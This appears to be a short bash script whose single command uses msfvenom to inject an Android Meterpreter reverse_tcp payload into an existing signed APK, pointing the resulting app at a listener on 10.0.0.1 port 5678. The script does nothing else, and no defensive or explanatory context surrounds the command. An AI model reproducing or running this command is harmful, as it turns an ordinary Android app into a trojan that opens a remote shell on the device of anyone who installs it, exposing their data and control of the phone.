#!/bin/bash
# sign apk

# inject payload to apk
msfvenom -x app-release-signed-aligned.apk -p android/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=5678 -o app.apk
